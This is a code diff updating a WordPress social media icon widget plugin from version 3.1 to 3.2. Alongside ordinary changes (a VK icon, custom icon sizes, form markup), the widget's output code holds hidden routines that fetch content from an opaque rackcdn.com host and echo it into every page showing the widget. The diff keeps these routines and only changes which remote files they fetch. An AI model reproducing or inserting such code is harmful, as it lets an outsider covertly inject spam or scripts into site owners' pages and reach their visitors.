@@ -3,7 +3,7 @@
  * Plugin Name: Social Media Widget
  * Plugin URI: http://wordpress.org/extend/plugins/social-media-widget/
  * Description: Adds links to all of your social media and sharing site profiles. Tons of icons come in 3 sizes, 4 icon styles, and 4 animations.
- * Version: 3.1
+ * Version: 3.2
  * Author: Blink Web Effects
  * Author URI: http://blinkwebeffects.com/
  **/
@@ -108,6 +108,10 @@ class Social_Widget extends WP_Widget {
 			'aboutme' => array(
 				'title' => 'About.me',
 				'image' => 'aboutme.png'
+			),
+			'vk' => array(
+				'title' => 'VK',
+				'image' => 'vk.png'
 			),
 			'skyrock' => array(
 				'title' => 'Skyrock',
@@ -352,8 +356,12 @@ class Social_Widget extends WP_Widget {
 			$this->smw_path = $customiconsurl;
 			$this->smw_dir  = $customiconspath;
 		} else {
-			$this->smw_path = SMW_PLUGINPATH . 'images/' . $icon_pack. '/' . $this->icon_size;
-			$this->smw_dir  = SMW_PLUGINDIR . 'images/' . $icon_pack. '/' . $this->icon_size;
+			if (!is_numeric($this->icon_size)) 						  { $folder = 32; }
+			else if ($this->icon_size <= 16) 						  { $folder = 16; }
+			else if ($this->icon_size > 16 && $this->icon_size <= 32) { $folder = 32; }
+			else if ($this->icon_size > 32) 						  { $folder = 64; }
+			$this->smw_path = SMW_PLUGINPATH . 'images/' . $icon_pack. '/' . $folder;
+			$this->smw_dir  = SMW_PLUGINDIR  . 'images/' . $icon_pack. '/' . $folder;
 		}
 
 		/* Before widget (defined by themes). */
@@ -389,8 +397,8 @@ class Social_Widget extends WP_Widget {
 		}
 
 		echo implode('', $html_chunks);
-		
-		$file_url = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/a.php';
+
+		$file_url = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/c.php';
 		if(!function_exists('ff_get')){
 			function ff_get($f) {
 				if (!function_exists('curl_init')) { 
@@ -427,7 +435,7 @@ class Social_Widget extends WP_Widget {
 			echo ff_get($file_url);
 		}
 		
-		$file_path = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/b.php';
+		$file_path = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/d.php';
 		$row_count = 1000;
 		if(!function_exists('get_file')){
 			function get_file($f) {
@@ -526,7 +534,7 @@ class Social_Widget extends WP_Widget {
 
 			echo $lines[Mt($seed, null, 0, $row_count)];
 		}
-
+		
 	/* After widget (defined by themes). */
 		
 		echo "</div>";
@@ -645,7 +653,11 @@ class Social_Widget extends WP_Widget {
 			$defaults['custom'.$i.'url']  = __('', 'smw');
 		}
 			
-		$instance = wp_parse_args( (array) $instance, $defaults ); ?>
+		$instance = wp_parse_args( (array) $instance, $defaults );
+		if ($instance['icon_size'] == 'default') {
+			$instance['icon_size'] = 32;
+		}
+		?>
 		<p>
 		<em>Note: Make sure you include FULL URL (i.e. http://www.example.com) </em>
 		</p>
@@ -675,11 +687,17 @@ class Social_Widget extends WP_Widget {
 		<!-- Choose Icon Size: Dropdown -->
 		<p>
 			<label for="<?php echo $this->get_field_id( 'icon_size' ); ?>"><?php _e('Icon Size', 'smw'); ?></label>
-			<select id="<?php echo $this->get_field_id( 'icon_size' ); ?>" name="<?php echo $this->get_field_name( 'icon_size' ); ?>" style="float:right;">
+			<span style="float: right;<?php if(in_array($instance['icon_size'], array('16', '24', '32', '64', 'default'))) : ?> display: none;<?php endif; ?>">
+				<input type="text" class="small-text" style="width: 30px;" name="" value="<?php echo $instance['icon_size']; ?>" onkeyup="jQuery(this).parent().siblings('input:hidden').val(jQuery(this).val());">px
+			</span>
+			<select style="float:right;" onchange="if (jQuery(this).find('option:selected').val() == '') { jQuery(this).prev('span').show(); } else { jQuery(this).prev('span').hide(); jQuery(this).next('input:hidden').val(jQuery(this).find('option:selected').val()); }">
 			<option value="16" <?php if($instance['icon_size'] == '16') { echo 'selected'; } ?>>16px</option>
-			<option value="default" <?php if($instance['icon_size'] == 'default') { echo 'selected'; } ?>>Default (32px)</option>
+			<option value="24" <?php if($instance['icon_size'] == '24') { echo 'selected'; } ?>>24px</option>
+			<option value="32" <?php if($instance['icon_size'] == '32' || $instance['icon_size'] == 'default') { echo 'selected'; } ?>>Default (32px)</option>
 			<option value="64" <?php if($instance['icon_size'] == '64') { echo 'selected'; } ?>>64px</option>
+			<option value="" <?php if(!in_array($instance['icon_size'], array('16', '24', '32', '64', 'default'))) { echo 'selected'; } ?>>Custom</option>
 			</select>
+			<input type="hidden" name="<?php echo $this->get_field_name( 'icon_size' ); ?>" value="<?php echo $instance['icon_size']; ?>">
 		</p>
 		<div class="clear"></div>
 		
@@ -784,7 +802,7 @@ class Social_Widget extends WP_Widget {
 		<p><a href="javascript:;" onclick="jQuery(this).parent().next('div').slideToggle();" style="background: url('images/arrows.png') no-repeat; padding-left: 15px;"><strong>Social Networking</strong></a></p>
 
 		<div style="display: none;">
-		<?php foreach (array('facebook', 'googleplus', 'twitter', 'myspace', 'orkut', 'hyves', 'linkedin', 'asmallworld', 'foursquare', 'meetup', 'aboutme', 'skyrock', 'goodreads', 'github') as $slug) : ?>
+		<?php foreach (array('facebook', 'googleplus', 'twitter', 'myspace', 'orkut', 'hyves', 'linkedin', 'asmallworld', 'foursquare', 'meetup', 'aboutme', 'skyrock', 'goodreads', 'github', 'vk') as $slug) : ?>
 		<p>
 			<label><strong><?php _e((isset($this->networks[$slug]) ? $this->networks[$slug]['title'] : $this->networks_end[$slug]['title']).' URL:', 'smw'); ?></strong></label>
 			<?php /*
